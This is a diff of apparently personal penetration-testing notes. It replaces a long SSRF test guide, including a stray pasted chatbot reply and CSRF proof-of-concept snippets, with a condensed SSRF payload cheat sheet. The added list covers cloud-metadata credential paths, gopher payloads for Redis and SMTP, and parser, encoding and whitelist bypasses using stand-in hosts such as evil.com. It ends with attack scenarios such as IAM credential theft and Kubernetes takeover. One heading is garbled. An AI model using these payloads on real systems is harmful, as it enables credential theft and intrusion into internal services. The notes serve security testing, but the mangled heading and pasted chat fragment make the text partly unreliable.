@@ -1753,310 +1753,138 @@ By injecting a CRLF sequence, the attacker can break the response into two parts
 * Email abuse:  Inject BCC → send spam via application.
 * Security bypass:  Inject headers like X-Forwarded-For: 127.0.0.1
 
-3. Server-Side Request Forgery (SSRF)
-
-### Exploitation Techniques:
-1. Abuse trust:
-   ```
-   any.com/index/php?uri=http://external.com
-   ```
-2. Bypass IP whitelisting:
-   ```
-   any.com/index/php?uri=file:/etc/passwd
-   ```
-3. Scan internal networks:
-   ```
-   any.com/index/php?uri=http://localhost:1
-   ```
-4. Cloud metadata extraction:
-   ```
-   http://169.254.169.254/latest/meta-data/
-   ```
-Of course, Anvesh. Here’s a **structured agenda-wise SSRF test case list** that can guide your pilot testing workflow. This format is built to flow logically from basic discovery to advanced exploitation and bypass techniques—perfect for methodical execution or automation planning.
-
-## 🧪 SSRF Pilot Testing Agenda
-
-Common parameters to checks: url, uri, dest, destination, redirect, redir, next, data, callback, return, site, domain, feed, host, hostname, port, path, reference, page, continue, window, out, view, show, navigation, to, target, rurl, rlink, link, img_url, file, source, img_src, download_url, proxy, load_url, open, forward, post_url, request_url
-
-### 🧭 1. Initial Recon & Target Parameter Discovery
-- Identify all user-controlled URL parameters in GET/POST requests
-- Map potential SSRF sinks:
-  - PDF rendering
-  - Avatar uploads
-  - Webhooks
-
-### 🔎 2. Basic SSRF Functionality Tests
-- Loopback access: `http://127.0.0.1/`
-- Internal IP probes: `http://192.168.0.1/status`
-- Public endpoints for comparison: `http://example.com`
-
-### ☁️ 3. Cloud Metadata Endpoint Abuse
-- AWS: `http://169.254.169.254/latest/meta-data/`
-- GCP: `http://metadata.google.internal/`
-- Azure: `http://169.254.169.254/metadata/instance`
-
-### 🌐 4. DNS / Out-of-Band SSRF Detection
-- Monitor using Burp Collaborator or Interactsh
-- Test external endpoint: `http://<your-collab>.domain.com`
-
-### 🔁 5. Redirect-Based SSRF
-- Open redirect chaining to SSRF sinks
-- Short URL abuse or redirection misdirections
-
-### 🧮 6. IP Format Obfuscation
-- Decimal: `http://2130706433`
-- Octal: `http://0177.1`
-- Hex: `http://0x7f000001`
-- IPv6: `http://[::ffff:127.0.0.1]`
-
-### 🧪 7. Protocol Smuggling Techniques
-- Gopher: `gopher://127.0.0.1/_INFO`
-- File: `file:///etc/passwd`
-- Dict, FTP, LDAP (if supported)
-
-### 🧬 8. SSRF via Alternate Injection Vectors
-- Headers: `Host`, `Referer`, `X-Forwarded-For`
-- Cookies: `url=http://127.0.0.1`
-- POST Body: JSON/XML SSRF injection
-- XXE payloads: `<!ENTITY x SYSTEM "http://127.0.0.1">`
-
-### 🖼️ 9. Business Logic Exploits
-- Avatar/image fetching endpoints
-- PDF generation using user-provided URLs
-- Callback/webhook abuse in CI/CD integrations
-
-### 🚪 10. Bypass & Evasion Techniques
-- CIDR whitelist evasion: `127.0.0.1.nip.io`
-- DNS rebinding attacks
-- Header spoofing via internal proxies
-
-# **1. List of Vulnerabilities (SSRF Attack Surface)**
-
-* **1.1 Internal Network Port Scanning** – attacker probes internal hosts.
-* **1.2 Accessing Cloud Metadata Services** – AWS, GCP, Azure.
-* **1.3 File Retrieval via Protocol Abuse** – `file://`, `gopher://`, `dict://`, `ftp://`.
-* **1.4 Blind SSRF** – no response body but side-effects (DNS/HTTP logs).
-* **1.5 URL Bypass via Encoding** – double encoding, IP obfuscation.
-* **1.6 Open Redirect SSRF** – redirects to internal targets.
-* **1.7 Header Injection via SSRF** – using gopher/dict protocols.
-* **1.8 DNS Rebinding** – external domain resolves to internal address.
-* **1.9 Host Validation Bypass** – malformed URLs to confuse parsers.
-* **1.10 SSRF → RCE or Database Exposure** – access admin panels, APIs, Redis, Docker.
-
----
+## Basic SSRF Payloads
 
-# **2. Sample Payloads (Core Attack Payloads)**
+* Localhost access:  http://127.0.0.1 → Access internal services.
+* Loopback hostname: http://localhost → Same as loopback.
+* IPv6 localhost:  http://[::1] → IPv6 bypass.
+* Internal hostname:  http://internal → Access internal DNS.
+* Private IP:  http://192.168.1.1 → Internal network scan.
 
-(Simple structure for learning — safe to read, no harmful effects)
+# 🔹 Internal Network Targeting
 
-### **2.1 Internal Network Scan**
+* RFC1918 ranges:  http://10.0.0.1, http://172.16.0.1, http://192.168.0.1
+* Docker network:  http://172.17.0.1
+* Kubernetes API:  https://kubernetes.default.svc
+* Service discovery:  http://consul.service.consul
 
-```
-http://127.0.0.1:22
-http://localhost:3306
-http://192.168.1.10:8080
-```
+# 🔹 Cloud Metadata Exploitation
 
-### **2.2 Cloud Metadata Access**
+* AWS metadata:  http://169.254.169.254/latest/meta-data/
+* AWS IAM creds:  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+* GCP metadata:  http://metadata.google.internal/computeMetadata/v1/
+* Azure metadata:  http://169.254.169.254/metadata/instance
+* GCP header requirement:  Add header: Metadata-Flavor: Google
 
-```
-http://169.254.169.254/latest/meta-data/
-http://metadata.google.internal/computeMetadata/v1/
-```
+# 🔹 URL Parser Bypass Payloads
 
-### **2.3 Protocol Abuse**
+* Using @ trick: http://127.0.0.1@evil.com → Parser confusion.
+* Double @:  http://evil.com@127.0.0.1
+* Userinfo bypass:  http://admin@127.0.0.1
+* Fragment bypass:  http://127.0.0.1#evil.com
+* Query override:  http://evil.com?url=http://127.0.0.1
 
-```
-file:///etc/passwd
-gopher://127.0.0.1:11211/
-ftp://127.0.0.1/etc/passwd
-```
+# 🔹 IP Encoding Bypass
 
-### **2.4 Open Redirect SSRF**
+* Decimal IP:  http://2130706433 → 127.0.0.1
+* Octal IP:  http://0177.0.0.1
+* Hex IP:  http://0x7f000001
+* Mixed encoding:  http://127.1
+* Short notation:  http://127.0.1
 
-```
-http://example.com/redirect?url=http://169.254.169.254/
-```
+# 🔹 DNS Rebinding Techniques
 
-### **2.5 URL Parser Bypass**
+* Attacker domain:  http://attacker.com → Resolves to internal IP later.
+* Dual resolution:  http://rebind.evil.com
+* Wildcard DNS:  http://127.0.0.1.nip.io
 
-```
-http://127.0.0.1@evil.com
-http://127.0.0.1:80#evil.com
-http://2130706433     (integer form of 127.0.0.1)
-```
+***
 
----
+# 🔹 Protocol-Based SSRF
 
-# **3. Bypass Payloads (Advanced Techniques)**
+* File protocol: file:///etc/passwd
+* Dict protocol:  dict://127.0.0.1:11211
+* Gopher payload:  gopher://127.0.0.1:6379/_INFO
+* FTP protocol:  ftp://127.0.0.1
+* SMB (Windows):  \\127.0.0.1\share
 
-(Used when the app blocks "localhost", "127.0.0.1", etc.)
+# 🔹 Gopher Advanced Payloads
 
-### **3.1 Encoded Localhost**
+* Redis command: gopher://127.0.0.1:6379/_SET%20key%20value
+* HTTP request smuggling:  gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1
+* SMTP injection:  gopher://127.0.0.1:25/_HELO%20evil.com
 
-```
-http://127.0.0.1
-http://127.1
-http://0
-```
+# 🔹 Path Traversal in SSRF
 
-### **3.2 Double/Triple Encoding**
+* File read via SSRF:  http://target/?url=file:///etc/passwd
+* Wrapper chaining:  http://target/?url=php://filter/...
 
-```
-http://%31%32%37.0.0.1
-http://%32%31%33%30%37%30%36%34%33%33   (integer representation)
-```
+# 🔹 Open Redirect Chaining
 
-### **3.3 DNS Rebinding Payload**
+* Redirect abuse:  http://trusted.com/redirect?url=http://127.0.0.1
+* Double redirect: http://trusted.com/?next=http://evil.com/?url=http://127.0.0.1
 
-```
-http://yourdomain.com       (A record → external, CNAME → internal)
-```
+# 🔹 SSRF via Headers
 
-### **3.4 “@” Authentication Bypass Trick**
+* Host override:  Host: 127.0.0.1
+* X-Forwarded-For: X-Forwarded-For: 127.0.0.1
+* X-Original-URL:  /admin
+* X-Rewrite-URL:  /admin
 
-```
-http://evil.com@127.0.0.1/
-```
+# 🔹 SSRF in Different Contexts
 
-### **3.5 IPv6-Only Bypass**
+* Image URL:  http://127.0.0.1
+* PDF generator:  http://127.0.0.1/admin
+* Webhook URL:  http://127.0.0.1
+* Callback URL:  http://localhost
 
-```
-http://[::1]/
-http://[0000:0000:0000:0000:0000:ffff:127.0.0.1]/
-```
+# 🔹 WAF Bypass Techniques (SSRF)
+## 🧩 Encoding Tricks
 
-### **3.6 Open Redirect Chain**
+* URL encoding: http%3a%2f%2f127.0.0.1
+* Double encoding:  http%253a%252f%252f127.0.0.1
+* Mixed encoding:  http://127.0.0.1%2f
+* Unicode bypass:  http://127.0.0.1\u0000
 
-```
-http://attacker.com/redirect?to=http://169.254.169.254/
-```
+## 🧩 Domain Obfuscation
 
-### **3.7 Gopher Protocol for Header Injection**
+* Subdomain trick:  http://127.0.0.1.evil.com
+* Long domain: http://127.0.0.1.attacker.com
+* Fake trusted domain:  http://trusted.com.evil.com
 
-```
-gopher://127.0.0.1:11211/_stats
-gopher://127.0.0.1:6379/_INFO
-```
+## 🧩 Whitelist Bypass
 
----
+* Prefix match bypass:  http://trusted.com@127.0.0.1
+* Suffix bypass:  http://127.0.0.1.trusted.com
+* Regex bypass:  http://trusted.com/.@127.0.0.1
 
-# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
+## 🧩 Scheme Confusion
 
-### **4.1 AWS EC2 Metadata Dump**
+* Mixed protocol:  HtTp://127.0.0.1
+* Missing scheme:  //127.0.0.1
+* Custom scheme:  http:\\127.0.0.1
 
-```
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-```
+## 🧩 DNS Tricks
 
-### **4.2 Redis RCE Trigger (Safe string shown)**
+* Embedded IP:  http://[::ffff:127.0.0.1]
+* Null byte:  http://127.0.0.1%00.evil.com
 
-```
-gopher://127.0.0.1:6379/_SET test "Hello"
-```
+# 🔹 Cloud Metadata Advanced Bypass
 
-### **4.3 Docker API Exposure**
+* AWS v1:  http://169.254.169.254/latest/meta-data/
+* AWS v2 bypass attempt:  Use PUT request with token fetch
+* GCP header injection:  Metadata-Flavor: Google
+* Azure API version:  http://169.254.169.254/metadata/instance?api-version=2021-02-01
 
-```
-http://localhost:2375/containers/json
-```
+# 🔹 Real-World Attack Scenarios
 
-### **4.4 Kubernetes API Exposure**
-
-```
-http://127.0.0.1:10250/pods
-```
-
-### **4.5 Jenkins Script Console**
-
-```
-http://localhost:8080/script
-```
-
-### **4.6 VM Metadata via Redirect**
-
-```
-http://open-redirect.com/?url=http://169.254.169.254/latest/
-```
-
-### **4.7 Blind SSRF DNS Callback**
-
-```
-http://abc.your-burp-collab.com
-```
-
----
-
-# **5. Validation / Test Steps**
-
-**Step 1:** Identify any parameter accepting a URL
-→ `url=`, `image=`, `callback=`, `redirect=`, `feed=`, etc.
-
-**Step 2:** Test internal access
-→ `http://localhost`, `http://127.0.0.1`, etc.
-
-**Step 3:** Try metadata service
-→ `169.254.169.254`
-
-**Step 4:** Try protocol shifts
-→ `file://`, `gopher://`, `ftp://`
-
-**Step 5:** Try bypass techniques
-→ encodings, redirects, IPv6, DNS rebinding.
-
----
-
-# **6. Expected Results / Impact**
-
-* Internal systems become reachable.
-* Metadata services leak secrets.
-* Admin portals exposed.
-* Redis/Memcached/DB exploitation.
-* Possible **RCE** in chained scenarios.
+* IAM credential theft → AWS metadata endpoint
+* Internal admin panel access → http://127.0.0.1/admin
+* Redis exploitation → gopher payload
+* Kubernetes takeover → access API server
+* File disclosure → file:///etc/passwd
   
-### Testing with Burp Collaborator:
-1. Open Burp Collaborator.
-2. Set interaction poll.
-3. Inject payload in a vulnerable parameter:
-   ```
-   /showimage.php?file=http://burp-collaborator-url
-   ```
-4. Check logs in Burp for external requests.
-
-## 4. Critical Files Exposure
-
-### Impact:
-- Exposure of sensitive files like `database credentials`, `server authentication data`, or `business logic information`.
-
-### Scanning:
-```bash
-dirb http://target.com/ wordlist.txt
-gobuster dir -u http://target.com/ -w wordlist.txt
-```
-
-## Cross-Site Request Forgery (CSRF)
-
-### Exploitation:
-#### Logout CSRF:
-```html
-<img src="http://target.com/logout.php">
-```
-#### Account Takeover CSRF:
-1. Capture a profile update request.
-2. Change `email` field in CSRF PoC.
-3. Open PoC in browser and submit.
-
-### JSON GET - Simple Request
-
-```html
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://www.example.com/api/currentuser");
-xhr.send();
-</script>
-```
-
-# ✅ **Cross-Site Request Forgery (CSRF) – Complete Test Case (with Bypass Cases)**
+# ✅ **c – Complete Test Case (with Bypass Cases)**
 ---
 # **1. List of Vulnerabilities (CSRF Attack Surface)**
 
